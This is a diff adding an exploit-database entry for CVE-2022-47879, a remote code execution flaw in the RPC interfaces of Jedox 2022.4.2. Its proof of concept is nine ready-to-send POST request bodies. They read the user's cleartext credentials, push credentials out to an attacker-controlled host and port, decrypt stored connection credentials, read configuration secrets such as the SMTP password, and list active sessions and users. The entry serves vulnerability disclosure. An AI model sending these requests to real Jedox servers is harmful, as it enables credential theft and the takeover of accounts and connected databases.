@@ -1,0 +1,189 @@
+id: 38659
+date: 05/05/2023
+title: Jedox 2022.4.2 - Code Execution via RPC Interfaces Vulnerability
+author: Team Syslifters
+cves: CVE-2022-47879
+
+# Exploit Title: Jedox 2022.4.2 - Code Execution via RPC Interfaces
+# Exploit Author: Team Syslifters / Christoph MAHRL, Aron MOLNAR, Patrick PIRKER and Michael WEDL
+# Vendor Homepage: https://jedox.com
+# Version: Jedox 2022.4 (22.4.2) and older
+# CVE : CVE-2022-47879
+
+
+Introduction
+=================
+A Remote Code Execution (RCE) vulnerability in /be/rpc.php and /be/erpc.php allows remote authenticated users to load arbitrary PHP classes from the rtn directory and to execute its methods. To exploit this vulnerability, the attacker needs knowledge about loadable classes, their methods and arguments.
+
+
+Write-Up
+=================
+See [Docs Syslifters](https://docs.syslifters.com/) for a detailed write-up on how to exploit vulnerability.
+
+
+Proof of Concept
+=================
+1) The `Studio::getUserCreds` function can be used to read the clear text credentials of the currently authenticated user.
+
+	PATH: /be/rpc.php
+	METHOD: POST
+	BODY:
+	[
+		[
+			"Studio",
+			"getUserCreds"
+		]
+	]
+
+2) Using function `conn::test_palo`, an outgoing HTTP connection can be initiated from the web server to an attacker controlled server (Specify HOST and PORT) with the authenticated user's credentials. This could leak cleartext credentials to an attacker.
+
+	PATH: /be/rpc.php
+	METHOD: POST
+	BODY:
+	[
+		[
+			"conn",
+			"test_palo",
+			[
+				"<HOST>",
+				"<PORT>",
+				"",
+				"",
+				true,
+				null
+			]
+		]
+	]
+
+3) The function `Studio::getExternURI` can be used to generate a URL with embedded username and encrypted password of the currently authenticated user.
+
+	PATH: /be/rpc.php
+	METHOD: POST
+	BODY:
+	[
+		[
+			"Studio",
+			"getExternURI",
+			[
+				0,
+				"",
+				[
+					0
+				],
+				{
+					"flag":1
+				}
+			]
+		]
+	]
+
+4) List all available database connections via `conn::ls`:
+
+	PATH: /be/rpc.php
+	METHOD: POST
+	BODY:
+	[
+		[
+			"conn",
+			"ls",
+			[
+				null,
+				false,
+				true,
+				[
+					"type",
+					"active",
+					"description"
+				]
+			]
+		]
+	]
+
+5) Retrieve details of individual database connection (specify connection name via CONNECTION) including encrypted credentials using the Java RPC function `com.jedox.etl.mngr.Connection::getGlobalConnection`:
+
+	PATH: /tc/rpc
+	METHOD: POST
+	BODY:
+	[
+		[
+			"com.jedox.etl.mngr.Connections",
+			"getGlobalConnection",
+			[
+				"<CONNECTION>"
+			]
+		]
+	]
+
+6) Some functions return credentials only in encrypted form. However, they can be decrypted by any user using `common::decrypt` (specify encrypted credentials via ENCRYPTEDCREDS):
+
+	PATH: /be/rpc.php
+	METHOD: POST
+	BODY:
+	[
+		[
+			"common",
+			"decrypt",
+			[
+				"<ENCRYPTEDCREDS>"
+			]
+		]
+	]
+
+7) Using `common::paloGet` it is possible to read arbitrary configuration parameters (specify config param via CONFIG. For example, the password of the SMTP server can be read with it (CONFIG: tasks.smtp.password):
+
+	PATH: /be/rpc.php
+	METHOD: POST
+	BODY:
+	[
+		[
+			"common",
+			"paloGet",
+			[
+				null,
+				"Config",
+				"#_config",
+				[
+					"config"
+				],
+				{
+					"config": [
+						"<CONFIG>"
+					]
+				},
+				true,
+				true
+			]
+		]
+	]
+
+8) The function `palo_mgmt::sess_list` can be used to retrieve a list of all active user sessions. The session information includes not only the username but also the user's IP address, information about the browser and other data.
+
+	PATH: /be/rpc.php
+	METHOD: POST
+	BODY:
+	[
+		[
+			"palo_mgmt",
+			"sess_list",
+			[
+				null
+			]
+		]
+	]
+
+9) The function `palo_mgmt::lic_users_list` returns a list of all users stored in the system:
+
+	PATH: /be/rpc.php
+	METHOD: POST
+	BODY:
+	[
+		[
+			"palo_mgmt",
+			"lic_users_list",
+			[
+				"0"
+			]
+		]
+	]
+
+#  0day.today [2023-05-22]  #
